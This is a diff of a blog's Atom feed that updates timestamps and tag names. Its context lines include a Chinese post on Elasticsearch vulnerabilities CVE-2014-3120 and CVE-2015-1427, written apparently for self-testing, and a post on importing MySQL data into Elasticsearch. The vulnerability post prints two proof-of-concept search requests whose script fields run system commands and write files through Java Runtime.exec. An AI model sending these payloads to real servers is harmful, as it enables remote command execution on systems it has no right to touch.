@@ -91,7 +91,7 @@
     <link href="http://ohroot.com/2015/09/08/safety-problem-of-elasticsearch/"/>
     <id>http://ohroot.com/2015/09/08/safety-problem-of-elasticsearch/</id>
     <published>2015-09-08T03:07:34.000Z</published>
-    <updated>2015-09-08T03:09:22.000Z</updated>
+    <updated>2015-09-09T09:18:06.000Z</updated>
     <content type="html"><![CDATA[<p>这篇文章主要是研究下Elasticsearch的一些漏洞，因为自己开发的系统也用到了Elasticsearch，自己检测下，顺便学习下<br><a id="more"></a><br>我主要看到的就是一个是CVE-2014-3120和CVE-2015-1427，至于什么配置不当，外网能访问不在考虑范围内，Elasticsearch本来就是没有认证的，应该在内网并且做安全配置的。</p>
 <h2 id="CVE-2014-3120">CVE-2014-3120</h2><p>关于这儿漏洞主要就是script_fields里面允许执行代码，可以通过java代码执行系统命令，我找了网上的poc，在我1.6版本的ES上测试并没有能成功复现，为了阅读方便我也稍微格式化了json代码。通过后面的深入研究好像是这个已经修复了,详情可以看乌云关于CVE-2015-1427的分析。<a href="http://drops.wooyun.org/papers/5107" target="_blank" rel="external">地址在这里</a><br>exp1：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">192.168</span>.<span class="number">32.152</span>:<span class="number">9200</span>/_search?<span class="built_in">source</span>=</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">"size"</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="string">"query"</span>: &#123;</span><br><span class="line">        <span class="string">"filtered"</span>: &#123;</span><br><span class="line">            <span class="string">"query"</span>: &#123;</span><br><span class="line">                <span class="string">"match_all"</span>: &#123;&#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">"script_fields"</span>: &#123;</span><br><span class="line">        <span class="string">"exp"</span>: &#123;</span><br><span class="line">            <span class="string">"script"</span>: <span class="string">"import java.util.*;\nimport java.io.*;\nString str = \"\";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\"ifconfig\").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null)&#123;sb.append(str);&#125;sb.toString();"</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
 <p>exp2<br><figure class="highlight nimrod"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">32</span>.<span class="number">150</span>:<span class="number">9200</span>/_search?source=</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">"size"</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="string">"query"</span>: &#123;</span><br><span class="line">        <span class="string">"filtered"</span>: &#123;</span><br><span class="line">            <span class="string">"query"</span>: &#123;</span><br><span class="line">                <span class="string">"match_all"</span>: &#123;&#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">"script_fields"</span>: &#123;</span><br><span class="line">        <span class="string">"exp"</span>: &#123;</span><br><span class="line">            <span class="string">"script"</span>: <span class="string">"import java.util.*;\nimport java.io.*;\nFile f = new File(\"/tmp/12.txt\");if(f.exists())&#123;\"exists\".toString();&#125;BufferedWriter bw = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(f),\"UTF-8\"));bw.write(\"1233\");bw.flush();bw.close();if(f.exists())&#123;\"success\".toString();&#125;"</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
@@ -103,7 +103,7 @@
     
     </summary>
     
-      <category term="ElasticSearch" scheme="http://ohroot.com/tags/ElasticSearch/"/>
+      <category term="Elasticsearch" scheme="http://ohroot.com/tags/Elasticsearch/"/>
     
       <category term="Web安全" scheme="http://ohroot.com/categories/Web%E5%AE%89%E5%85%A8/"/>
     
@@ -225,7 +225,7 @@
     <link href="http://ohroot.com/2015/05/18/MySQL%E6%95%B0%E6%8D%AE%E5%AF%BC%E5%85%A5ElasticSearch/"/>
     <id>http://ohroot.com/2015/05/18/MySQL数据导入ElasticSearch/</id>
     <published>2015-05-18T13:37:54.000Z</published>
-    <updated>2015-05-18T13:49:57.000Z</updated>
+    <updated>2015-09-09T09:16:40.000Z</updated>
     <content type="html"><![CDATA[<p>Github上主要是有三个项目，分别是<a href="https://github.com/siddontang/go-mysql-elasticsearch" target="_blank" rel="external">go-mysql-elasticsearch</a>、<a href="https://github.com/jprante/elasticsearch-river-jdbc" target="_blank" rel="external">elasticsearch-river-jdbc</a>和<a href="https://github.com/scharron/elasticsearch-river-mysql" target="_blank" rel="external">elasticsearch-river-mysql</a> ……<br><a id="more"></a></p>
 <h2 id="go-mysql-elasticsearch">go-mysql-elasticsearch</h2><p>go-mysql-elasticsearch 是一个将MySQL数据导入到Elasticsearch的服务，他是用<code>mysqldump</code>来获取源数据，然后使用binlog同步数据，按照github上说明，他好像是使用go语言开发的一款工具，实现数据迁移。搭建需要go环境支持。<br>他主要可以实现：</p>
 <ul>
@@ -250,7 +250,7 @@
     
     </summary>
     
-      <category term="ElasticSearch" scheme="http://ohroot.com/tags/ElasticSearch/"/>
+      <category term="Elasticsearch" scheme="http://ohroot.com/tags/Elasticsearch/"/>
     
       <category term="编程" scheme="http://ohroot.com/categories/%E7%BC%96%E7%A8%8B/"/>
     
